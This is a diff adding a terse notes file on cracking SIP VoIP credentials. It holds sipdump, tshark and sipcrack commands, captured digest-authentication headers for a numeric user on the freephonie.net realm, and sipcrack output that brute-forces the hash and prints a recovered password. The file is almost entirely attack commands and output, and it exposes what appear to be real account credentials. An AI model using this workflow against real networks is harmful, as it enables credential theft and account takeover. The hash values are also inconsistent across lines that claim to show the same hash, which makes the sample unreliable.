@@ -1,0 +1,45 @@
+- sipdump -i eth0 /root/desktop/sip.txt
+- sipdump -i eth0 /root/desktop/sip.txt -w /usr/share/wordlist/big.txt
+- sipdump -p ~/tmp/sip.pcap logins.dump
+- sipcrack -w ~/exploits/dictionaries/test.txt logins.dump
+
+
+
+
+[Sample #1]
+
+- tshark -r sip.pcap -Tfields -e sip.auth | grep username
+
+Proxy-Authorization: Digest username=\"0950236158\",realm=\"freephonie.net\",
+nonce=\"04cd38e646e760da129f99fa734ac1e4\",uri=\"sip:0950236158@freephonie.net\",
+response=\"dc59445f8ef78a615a2ad4d57835a383\",algorithm=MD5,
+opaque=\"04cc3f555880bdf\"\x0d\x0a
+Proxy-Authorization: Digest username=\"0950236158\",realm=\"freephonie.net\",
+nonce=\"04cd38e646e760da129f99fa734ac1e4\",uri=\"sip:172.17.20.241:5062\",
+response=\"dc59995a8eb78f605a2ad5d57835a383\",algorithm=MD5,
+opaque=\"04cd38e646e760\"\x0d\x0a
+
+---------------------------
+[Samples #2]
+
+- sipcrack -w ~/exploits/dictionaries/test.txt logins.dump
+
+SIPcrack 0.3pre  ( MaJoMu | www.codito.de ) 
+----------------------------------------
+
+* Found Accounts:
+
+Num	Server		Client		User	Hash|Password
+
+1	192.168.1.29	212.27.52.5	0950236158	dc59495f8eb78a605a2ad5d57835a383
+
+* Select which entry to crack (1 - 1): 1
+
+* Generating static MD5 hash... 04cd38e646e760da129f99fa734ac1e4
+* Starting bruteforce against user '0950236158' (MD5: 'dc59445f8ef78a615a2ad4d57835a383')
+* Loaded wordlist: '~/exploits/dictionaries/test.txt'
+* Starting bruteforce against user '0950236158' (MD5: 'dc59445f8ef78a615a2ad4d57835a383')
+* Tried 10 passwords in 0 seconds
+
+* Found password: '507ZEy@l'
+* Updating dump file 'logins.dump'... done
